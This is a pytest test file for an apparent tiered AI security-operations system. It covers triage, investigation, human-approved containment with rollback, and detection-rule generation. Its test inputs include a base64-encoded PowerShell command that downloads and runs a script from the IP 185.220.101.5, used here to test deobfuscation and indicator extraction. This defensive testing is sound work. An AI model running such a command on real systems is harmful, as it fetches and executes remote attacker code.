import pytest
from server.soc.models import SeverityLevel, IncidentStatus, ActionRiskLevel, ApprovalStatus
from server.soc.tier1_triage import tier1_triage_agent
from server.soc.tier2_responder import tier2_responder_agent
from server.soc.tier3_hunter import tier3_hunter_agent
from server.soc.soc_guardrails import soc_guardrail_engine
from server.soc.case_memory import soc_case_memory
from server.soc.telemetry_generator import telemetry_generator
from server.soc.soc_orchestrator import soc_orchestrator

def test_tier1_normalization_and_triage():
    raw_event = {
        "event_id": "EVT-TEST-001",
        "source_type": "EDR",
        "hostname": "PROD-DB-01",
        "ip_address": "185.220.101.5",
        "user_identity": "svc_backup_admin",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -enc SQBFAFgA",
        "file_hash": None
    }
    
    event = tier1_triage_agent.normalize_event(raw_event)
    assert event.hostname == "PROD-DB-01"
    assert event.ip_address == "185.220.101.5"

    triage = tier1_triage_agent.triage_event(event)
    assert triage.risk_score >= 80
    assert triage.severity in [SeverityLevel.P1, SeverityLevel.P2]
    assert triage.escalate_to_tier2 is True
    assert len(triage.threat_intel) > 0
    assert triage.threat_intel[0].ioc == "185.220.101.5"
    assert len(triage.mitre_attack) > 0

def test_tier2_investigation_and_containment():
    raw_event = {
        "source_type": "EDR",
        "hostname": "PROD-DB-01",
        "ip_address": "185.220.101.5",
        "user_identity": "svc_backup_admin",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -enc SQBFAFgA"
    }
    event = tier1_triage_agent.normalize_event(raw_event)
    triage = tier1_triage_agent.triage_event(event)

    case = tier2_responder_agent.investigate_incident(triage, "CASE-TEST-001")
    assert case.case_id == "CASE-TEST-001"
    assert len(case.timeline) >= 2
    assert len(case.hypotheses) >= 1
    assert case.explainability is not None
    assert "PROD-DB-01" in case.explainability.affected_entities["assets"]
    
    # Check containment action gating
    high_risk_actions = [a for a in case.containment_actions if a.risk_level == ActionRiskLevel.HIGH]
    assert len(high_risk_actions) > 0
    assert high_risk_actions[0].action_name == "isolate_endpoint"
    assert high_risk_actions[0].approval_status == ApprovalStatus.PENDING

def test_tier3_deobfuscation_and_sigma_rule():
    obfuscated_cmd = "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAGEAcAAxACcAKQA="
    deob = tier3_hunter_agent.deobfuscate_script(obfuscated_cmd)
    assert deob["is_obfuscated"] is True
    assert "185.220.101.5" in deob["extracted_iocs"]

    # Test Sigma Rule generation
    raw_event = telemetry_generator.trigger_attack_scenario("SCENARIO_COBALT_STRIKE")[0]
    case = soc_orchestrator.process_incoming_security_event(raw_event)
    assert case is not None
    assert len(case.detection_rules) >= 1
    assert case.detection_rules[0].rule_type == "SIGMA"
    assert "logsource:" in case.detection_rules[0].rule_content

def test_guardrails_approval_and_rollback():
    action = soc_guardrail_engine.propose_action(
        case_id="CASE-UNIT-TEST",
        action_name="isolate_endpoint",
        target={"hostname": "PROD-DB-01"},
        reason="Unit test containment",
        evidence=["Unit test event"],
        confidence=0.95,
        expected_impact="Host isolated",
        rollback_strategy="reconnect_endpoint_network('PROD-DB-01')"
    )
    assert action.approval_status == ApprovalStatus.PENDING

    # Test Approval
    soc_guardrail_engine.execute_action(action, approver="TEST_OPERATOR")
    assert action.approval_status == ApprovalStatus.APPROVED
    assert action.approver == "TEST_OPERATOR"

    # Test Rollback
    rollback_res = soc_guardrail_engine.rollback_action(action.action_id, operator="TEST_OPERATOR")
    assert rollback_res["success"] is True
    assert action.is_rolled_back is True
    assert action.approval_status == ApprovalStatus.ROLLED_BACK

def test_full_orchestrator_pipeline():
    events = telemetry_generator.trigger_attack_scenario("SCENARIO_MIMIKATZ_LSASS")
    case = soc_orchestrator.process_incoming_security_event(events[0])
    assert case is not None
    assert case.severity == SeverityLevel.P1
    assert "CORP-DC-01" in case.title
    
    summary = soc_orchestrator.get_security_posture_summary()
    assert "Warning" in summary or "active" in summary or "incident" in summary
